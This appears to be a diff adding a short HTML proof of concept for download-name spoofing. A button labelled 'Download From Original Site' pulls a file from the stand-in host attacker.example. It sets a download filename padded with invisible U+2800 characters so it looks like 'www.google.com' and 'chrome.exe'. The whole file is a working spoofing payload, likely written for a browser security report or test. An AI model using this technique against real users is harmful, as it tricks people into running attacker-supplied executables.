@@ -1,0 +1,10 @@
+<!doctype html><meta charset="utf-8">
+<button onclick="a()">Download From Original Site</button>
+<script>
+function a(){
+  var link=document.createElement('a');
+  link.href='https://attacker.example/file';           // real attacker-hosted bytes
+  link.download='From\u2800www.google.com\u2800\u2800\u2800\u2800\u2800chrome.exe'; // U+2800 padding
+  link.click();
+}
+</script>
